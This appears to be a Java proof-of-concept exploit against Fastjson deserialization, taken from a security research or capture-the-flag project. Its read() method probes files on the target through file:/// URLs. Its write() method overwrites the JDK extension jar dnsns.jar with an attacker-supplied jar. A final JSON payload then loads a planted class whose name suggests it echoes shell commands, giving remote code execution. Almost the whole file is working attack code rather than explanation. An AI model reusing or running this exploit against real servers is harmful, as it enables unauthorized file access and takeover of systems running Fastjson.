package vul;

import com.alibaba.fastjson.JSON;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;

public class JacksonAttack {
    public static void main(String[] args) throws IOException {
        write();
    }

    public static void read() throws IOException {
        loadByJackson();

        String json = new String(Files.readAllBytes(Paths.get("poc/poc80/ioRead.json")), StandardCharsets.UTF_8);
        String url = "file:///D:/123";
        byte[] byteArray = {97};

        String replace = json.replace("${url}", url).replace("${byteArray}", Arrays.toString(byteArray));
        Object parse = JSON.parse(replace);
        // 爆破失败时打印 null
        System.out.printf("parse:%s\n", parse);

    }

    public static void write() throws IOException {
        // 缓存 InputStream
        loadByJackson();


        String content = "flag{{{";
        byte[] bytes = Files.readAllBytes(Paths.get("D:/badCode/jar/dnsns.jar"));
        String hex = bytesToHexString(bytes);
        String path = "/usr/local/openjdk-8/jre/lib/ext/dnsns.jar";

        // 记得根据 content 还是 bytes 进行修改
//        byte[] byteArray = new byte[content.getBytes().length + 1];
        byte[] byteArray = new byte[bytes.length + 1];

        String poc2 = new String(Files.readAllBytes(Paths.get("poc/poc80/ioDecoder.json")), StandardCharsets.UTF_8);


        String replace = poc2.replace("${hexContent}", hex).replace("${path}", path).replace("${byteArray}", Arrays.toString(byteArray));

        // 打印写入 payload
        System.out.println(replace);

//        JSON.parse(replace);

        // 触发写入的恶意类
        String poc3 = "{\n" +
                "    \"@type\": \"java.lang.Exception\",\n" +
                "    \"@type\": \"Tomcat678910cmdechoException\"\n" +
                "}";
    }

    public static void loadByJackson() throws IOException {
        String json = new String(Files.readAllBytes(Paths.get("poc/poc80/loadByJackson.json")), StandardCharsets.UTF_8);
        try{
            JSON.parse(json);
        }catch (Exception e){

        }
    }

    public static String bytesToHexString(byte[] bytes) {
        if (bytes == null) {
            return null;
        }
        StringBuilder sb = new StringBuilder(bytes.length * 4);
        for (byte b : bytes) {
            sb.append("\\x");
            String hex = Integer.toHexString(b & 0xff);
            if (hex.length() == 1) {
                sb.append("0");
            }
            sb.append(hex);
        }
        return sb.toString();
    }
}
